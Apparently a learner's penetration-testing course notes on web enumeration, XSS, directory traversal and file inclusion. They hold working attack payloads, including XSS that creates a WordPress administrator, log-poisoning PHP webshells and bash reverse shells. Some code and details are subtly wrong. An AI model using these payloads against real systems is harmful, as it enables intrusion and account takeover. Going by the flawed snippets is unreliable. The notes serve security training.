This learning module contains:

1.  Web application assessment methodology;
2.  Web application enumeration; and
3.  Cross-site scripting.
## Web application assessment methodology
This learning module contains;

1.  Understand web application security testing requirements;
2.  Learn different types of methodologies of web application testing; and 
3. Learn about the OWASP top 10 and most common web vulnerabilities.

There are generally speaking 3 different types of web application testing methodologies: white-box; black-box and grey-box.

With white-box testing, the customer (application owner) provides access to the application, source code, and infrastructure.  The pen test focuses on application logic and source code review.

Black-box review is essentially the opposite, where  the pen tester is not provided any details at all.  This is how bug bounty programs operate.

Grey-box is somewhere in the middle, with some details provided.
## Web application assessment tools
We will use several tools in web application enumeration, including NMAP, Wappalyzer, GoBuster and BurpSuite proxy.
### NMAP
NMAP stand scanning techniques can be used to identify OS, application services and versions as well as vulnerabilities.
### Wappalyzer
Wappalyzer is a free and paid product which is used to identify the tech stack of any web application.
### GoBuster
GoBuster is a directory brute-forcing application that is used to identify the directory structure of web applications.  It is frequently used with 'word-lists'.

~~~ bash
# GoBuster brute-forcing with word-lists.
# the dir parameter is for searching for directories

gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt 

~~~
### Burp-suite
Burp-suite is a GUI based integrated platform for web application security testing.  There is a community based version that is used for manual testing and the commercial version has considerably more functions.

Burp-suite requires that a proxy is configured to capture and modify if required.  There is a built-in proxy and it can be configured with 3rd party plugins like [Foxy Proxy](https://getfoxyproxy.com).  

The steps to configure the internal proxy server are as follows:

1.  Select the 'proxy' tab;
2.  Disable the 'intercept' option;
3.  Select the 'proxy settings' option;
4.  By default burp suite listens on localhost:8080;
5.  Firefox needs to be configured.  Add 'about:preference#general'.  At the bottom of the  page select the 'settings' option.
6.  Select the 'manual' and the 'also use this proxy for https';
7.  Set the 'HTTP' proxy to '127.0.0.1:8080'; and
8.  Select 'Ok';

With the proxy configured the http data will be captured by Burp-suite.  We can now see both the request and response details.
#### Intruder
The 'Intruder' tool within Burpe-suite is used to automate a variety of attack methods.  It can be used to undertake a simple brute-force attack.

Configure the proxy server as usual so that it captures web traffic as normal.  When a password is submitted via 'Wordpress' site a POST request is used.  From within the the http-history tab and right click on the post item and 'send to intruder'.

Intruder can then be used to manipulate the 'password' component of the POST request.
## Web application enumeration
### Learning objectives
1.  Learn how to debug web applications;
2. Understand how to enumerate and inspect headers, cookies and source code; and
3. Learn how to conduct API testing methodologies.

It is important to utilise passive enumeration techniques initially to discover the implemented technology stack.  Generally, this consists of:
1.  Host Operating System (OS);
2. Web server software;
3. Database software; and
4. Front and back-end programming.

It is worthwhile to note that many web applications are implemented using off the shelf frameworks and bundles.  Common examples of this include:
1.  Flask;
2. Django;
3. Wordpress; and
4. Drupal.

It is important to identify the components of a web application before attempting to blindly exploit it.  Many web application vulnerabilities are technology agnostic, however, others need to be carefully configured for a specific target.
### Inspect HTTP response headers and site maps
The robots.txt contains the pages which bots can and cannot access.  They are relevant for search engines.  Robots.txt includes both allow and disallow directives, which instructs web crawlers and search engines which pages should and shouldn't indexed.  This can be ignored.  

~~~ bash
# this obtains the robots.txt for google.com

curl https://google.com/robots.txt
~~~
### Enumerating and abusing APIs
API are essentially access points to functions and data, which are built and deployed for machine to machine integration.

~~~ bash
# api are accessed with the following structure

https://api_name/v1/
~~~

Conventional tools like 'gobuster' can be used to identify API endpoints, which includes a 'pattern' function (-p). 

~~~ bash
# using the Gobuster pattern function
# pattern.txt contains the structure of the pattern we are going to bruteforce.
# {GOBUSTER}/v1
# {GOBUSTER}/v2

gobuster dir -u <IP> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt

# this returns results that follow this function

/books/v1
/users/v1
~~~

We can inspect the API by using the curl function:

~~~ bash

# the '-i' parameter includes the http headers in the response
curl -i https://<IP>/users/v1

# this can return a list of users which can be brute-forced
# it returns several usernames including 'admin'

# with this additional username information known, we can try to breute-force the username component of the api

gobuster dir -u https://<IP>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt

# this returns additional api information, including 'email' and 'password'

curl -i https://<IP>/users/v1/admin/password

# this results in a '405 method not allowed'.  This suggests that the endpoint exists.  By default, the curl command uses the 'GET' method (which is not allowed).  
~~~
## Steps
Fix this
1.  Scan the target with gobuster using a api pattern
2.  Enumerate users by sending commands to the API endpoint - user/v1
3.  With a known users scan the user endpoint with gobuster - user/v1/admin
4.  Call the password endpoint
## Cross site scripting
Data sanitization is a process in which user input is processed to remove all dangerous characters and strings.  This prevents users from injecting and potentially execute malicious code.

Cross-site scripting (XSS) is a vulnerability that exploits a users trust in a website by dynamically injecting content into the page rendered by the users browser.  XSS is considered high risk and prevalent.

There are two main categories of XSS, 'stored' and 'reflected'.  
#### Stored XSS
Stored XSS attacks, which are also know as 'persistent XSS' occur when the exploit payload is stored in a database or otherwise cached by the server.  A single stored XSS vulnerability can therefore attack all site users.

Reflected XSS attacks usually include the payload in a crafted request or link.  The web application takes this value and places into the page content.  This XSS variant only attacks the person submitting the request or visiting the link.  Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages.

Either of these two vulnerabilities can manifest as client (browser) or server-side;  the can also be DOM based.

DOM-based XSS takes place solely within the DOM.  

The different types of XSS are differentiated by how the payload is delivered and executed.  All XSS vulnerabilities are run under the context of the user visiting the affected page.  This means that the users browser not the web application executes the XSS payload. 

When a browser processes a servers HTTP response containing HTML, the browser creates a DOM tree and renders it.  The DOM is comprised of all forms, inputs, images e.t.c. related to the web page.  
#### Java-script refresher
Java-scripts role is to access and modify the DOM, resulting in a more interactive web user experience.  Fro an attackers perspective, this means that if we can inject java-script code into the application, we can access and modify the page's DOM.  With access to the DOM, we can redirect login forms, extract passwords and steal session cookies.

~~~ js
function multiplyValues(x,y) {
	return x * y;
}

let a = multiplyValues(3,5)
console.log(a)
~~~
#### Identifying XSS vulnerabilities
We can find potential entry points for XSS by examining a web application and identifying input fields (such as search fields) that accept unsanitised input, which is then displayed as output in subsequent pages.

Once we identify an entry point, we can input special characters and observe the output to determine if any special characters return unfiltered.  

~~~ bash
# the most common special characters are

< > ' " { } ;
~~~
#### Basic XSS
In this example we will exploit a known vulnerability in a Wordpress plugin called 'visitors'.  The plugins main feature is to log the websites visitor data, including the IP, source and User-Agent fields.  The source code for the plugin can be downloaded from its website.  If we inspect the database.php file, we verify how the data is stored inside the Wordpress database.

~~~ php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
~~~

In this example 'burp-suite proxy' captures HTTP requests.  These WordPress Visitors plugin captures the 'HTTP User-Agent' data and stores it in the WordPress database.  When the admin reloads the Visitors plugin the start.php code block will run.

Using the 'Burp-suite' repeater function, we can modify the data in the 'User-Agent' field with the code that we want to run.  In this case we will inject the following code:

~~~ js

User-Agent:<script>alert(42)</script>

~~~

Rather than recording this data, it runs the arbitrary code and displays the message block on the sites page. 
#### Session cookies
With XSS we can steal session cookies and session information if the application uses and insecure session management configuration.  If we can steal an authenticated users session cookie we can masquerade as that user within the target web site.  
Websites use cookies to track state and information about users.  Cookies can be set with several optional flags, including two that are particularly interesting to us as pen tester:  Secure and HTTP Only.

The secure flag instructs the browser to only send the cookie over encrypted connections, such as HTTPS.  This protects the cookie from being send in clear text and captured over the network.

The HTTPOnly flag instructs the browser to deny JavaScript access to the cookie.  If this flag is not set, we can use an XSS payload to steal the cookie.
#### Privilege Escalation
By injecting some JavaScript in the 'User-Agent' HTTP header, which is then run when the WordPress Administrator reloads the plugin the JavaScript is executed.  Because this code is executed by an Administrator, we can use this to inject JavaScript code that creates a new user.  Essentially, code is injected into a WordPress database which also stores information of the relevant plugin.  When the administrator reloads the plugin, the injected code executes, by default with administrative privileges. 

This new attack angle which is to fetch the WordPress admin nonce.  The nonce is a server generated token that is included in the HTTP request to add randomness and prevent Cross-Site-Request-Forgery attacks (CSRF).  A CSRF attack occurs via social engineering in which the victim clicks on a malicious link that performs a preconfigured action on behalf of the user.  
The malicious link could be disguised by an apparently-harmless description, often luring the victim to click on it.

~~~ html
<a href="http://fakecryptonbank.com/send_btc?account=ATTACKER&amount=1000000"">Check out these awesome cat memes!</a>
																			  ~~~

In order to use an exploit above, we need to obtain the WordPress nonce.

~~~ js
// using JS to obtain the WordPress nonce.

var ajaxRequest = new XMLHttpRequest();
var requestURL = /wp-admin/user-new.php;
var nonceRegex = /ser" value="([^"]*?)"/g;
ajexRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responceText);
var nonce = nonceMatch[1];
~~~

Now that we have the WP nonce we can craft the main function responsible for creating the new admin users.

~~~ js
// creating the new wordpress admin user

var params = "action=createuser&_wpnonce_create-user="+nonce+"& user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest =  new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type)", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
~~~

Finally we need to encode the minified JavaScript code, so any bad characters wont interfere with sending the payload.  We can do this using the following function.

~~~ js
function encode_to_javascript(string){
	var input = string;
	var output = '';
	for(pos = 0, pos < input.length; pos++); {
		output += input.charCodeAt(pos);
		if(pos != (input.length -1)) {
			output += ",";
		}
	} 
	return output:
	}
let encode = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
~~~
## Directory Traversal
In this section, we will understand what a directory traversal vulnerability is, how it can be identified and exploited.  It is also useful to know how to correct the vulnerability.
### Absolute and relative paths
The easiest way to understand the difference between absolute and relative paths is to visualise the location of a file system as if you were in it.  A relative path is the directions that you would take to get from where you are to where you need to be i.e. the directions are based on where you are.  An absolute path is the location/directions to the location you want to go  from the root directory.

~~~ bash
# if Im in the home directory "/home/kali" and I want to get to the 'Downloads' direcotry I would use the command below.
pwd
/home/kali
cd Downloads
pwd
/home/kali/downloads

# from the root directory
pwd
/
cd Downloads
cd: no such file or directory: Downloads

# this error is because the 'Downloads' directory isn't in the current working directory. 
cd /home/kali/Downloads

# this works as we specify the directions to the 'Downloads' directory from a know position.  In this case, the root direcotry
~~~
### Identifying and exploiting directory traversals
These types of exploits are generally caused by developers not sanitising user input.  When a web application shows a web page, that file is retrieved from the file system.  These files are generally stored in the web-server root directory or one if its sub-directories.  On Linux based web-servers, the 'var/www/html' directory is frequently used as the web root directory.  
When a web application serves a page 'http://www/example.com/file.html' it will access the 'file.html' from the '/var/www/html/file.html' directory.  
A web application is susceptible to a directory traversal exploit when file outside of the web-root can be accessed using a relative path.  A directory traversal using relative paths can be used to access sensitive files including SSH private keys or configuration files.

It is important to examine all of the links on a page to identify directory traversal vulnerabilities.
~~~ bash
https://example.com/cms/login.php?language=en.html
~~~
The URL above shows that a language parameter accepts 'en.html'.  If we try the following URL we can confirm if a 'en.html' exists.
~~~ bash
https://example.com/cms/en.html
~~~
If this loads the page, we know that the 'en.html' is a file on the server, which means we can use the parameter to try other file names. 
'It is very useful to examine parameters closely when they use files as a value'.
The URL indicates that the site uses a 'CMS' and the files for this are located in a sub-directory of the web root.
On Linux systems it is a simple process to confirm directory traversal vulnerability by trying to read the 'passwd' file, which is located at '/etc/passwd'.  If this is available, we can check for SSH private keys by including '/home/offsec/.ssh/id_rsa'.
Once a vulnerability has been identified, we should avoid using web browsers for exploitation or exploration and instead utilise Burp-suite, cURL or a scripting/programming language of choice. 
A private SSH key can be copied into a text file and then used to connect to the target using SSH.
#### On Windows
On a Windows system, the '/etc/passwd'  isn't there.  Instead, 'C:\Windows\System32\drivers\hosts\' can be used to test for a directory traversal vulnerability.
#### Character encoding
When directory traversal vulnerabilities exist, these can be mitigated by filtering user input.  This would likely include filtering out sequences of characters that are used to traverse directories i.e. '/../../../'.  These can be bypassed by utilising character (percent) encoding.  Characters like '/' can be encoded as '%2e'.  These are essentially the same thing, however, the later won't be stopped by the filtering.
#### Local file inclusion
In contrast with directory traversal vulnerabilities, a file inclusion vulnerability allows us to include files inside an applications running code.  Directory traversal only allows us to read the contents of files.  
As an example, if a directory traversal vulnerability allows us to read the contents of a PHP file, where a file inclusion vulnerability would allow us to execute a PHP file.
Remote Code Execution (RCE) can be obtained by using a technique called 'log poisoning' (LP).  LP works by modifying data we send to a web application so that the log contains executable code.  In this scenario, if the file we include contains executable code it will be executed.  
As an example, we can write executable code to the 'access.log' file in the '/var/log/apache2/' directory. 
To do this we first need to understand what is included in a log entry by using a directory traversal exploit to view the 'access.log' file.  We can do this using the cURL command.
~~~ bash
# this will show the contents of the access.log file
curl http://application.com/subdirectory/index.php?page=../../../../../../../../../var/log/apache2/access.log
~~~
The contents of this file, shows that the 'user agent' is included in the access.log file.  We can use Burp-Suite to change what is in the 'user agent'.  Effectively, we add executable code in the 'user agent'.

~~~ bash
### HTTP HEADER ###
GET /meteor/index.php?page=admin.php HTTP/1.1
Host: mountaindesserts.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/ Firefox/91.0

### MODIFIED HTTP HEADER ###
GET /meteor/index.php?page=admin.php HTTP/1.1
Host: mountaindesserts.com
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
~~~
Modifying the HTTP header as above, includes executable PHP code in the access.log file.  We can then update the HTTP page parameter to execute the included PHP code.

~~~ bash
### HTTP HEADER ###
GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
Host: mountaindesserts.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/ Firefox/91.0
~~~
The two changes above provide the capacity to run any shell command.  The first change to the HTTP header includes PHP code in the access.log file.  This code uses PHP to run a shell command.  The second change is to utilise the directory traversal vulnerability to both pass an argument to the PHP code in the access.log file and run it.  In this instance, that argument is to run the shell 'ps' command, which lists running processes.  This command could be anything, including 'cat /etc/passwd', but may require character encoding where there is white space included.
It is best to use Burp-suite and the repeater feature to modify HTTP headers.
##### RCE Reverse shell
~~~ bash
# these are shell based reverse shell code snippets
# not supported by bourne shell
# host IP and Port (192.168.119.3/444)
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

# supported by bourne shell
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

# with character encoding
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22

# netcat listiner
nc -nvlp 4444
~~~
### PHP wrappers
PHP wrappers can be thought of a code library that can interact with external services or other APIs. 
We will only examine the 'filter' and 'data' wrappers in this section, however, there are many wrappers available.
The PHP filter wrapper is used to show the contents of a file, whereas the PHP data wrapper is used to execute code.
The examples below show how the wrappers can be used to reveal the underlying PHP files.
~~~ bash
# using the PHP filter wrapper to see the contents of a file
curl http://192.168.0.1/subdirectory/index.php?page=php://filter/resource=admin.php

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
~~~
Using the same PHP filter wrapper, with however, the Base64 encoding we obtain both the PHP and HTML in the encoded data.  This reveals additional information that the PHP filter wrapper by itself doesn't capture.
~~~ bash
# using the PHP filter wrapper with the Base64 encode parameter
curl http://192.168.0.1/subdirectory/index.php?page=php://filter/convert.base64-encode/resource=admin.php

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
~~~
We can then use the Base64 application with the -d flag to reveal additional information.
~~~ bash
# use the base64 application to decode the base64 string

echo "base64 string"| base64 -d

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
~~~
The PHP data filter can be used to execute code on the target system.  This can require character encoding and can include Base64 encoding.
~~~ bash
# PHP data filter with character encoding
curl "http://192.168.0.1/subdirectory/index.php?page=data//text/plain,<?php%20echo%20system('ls');?>"

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
~~~
Some systems may filter keywords like 'system', in this scenario we  can try to use the PHP data wrapper with a Base64 encoded string and use 'curl' to embedded it and then execute with the PHP data wrapper.
~~~ bash
# create the base64 encoded string
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

curl "http://192.168.0.1/subdirectory/index.php?page=data://text/plain;base64,```
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"

<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
~~~
### Remote File Inclusion
While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.  The included file can be executed in the context of the web application.
Kali Linux includes several web-shells in the '/usr/share/webshells/php' directory that can be used for RFI.  
#### Web-shells
A web-shell is a small script that provides a web-based command line interface, making it easier and more convenient to execute commands.  One of the web-shells provided by Kali Linux is the 'simple-backdoor.php'
### OS Command Injection
Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
## Tags
#enumeration
#nmap 
#burpsuite
#Wappalyzer
#gobuster
#foxyproxy
#firefoxproxy
#intruder





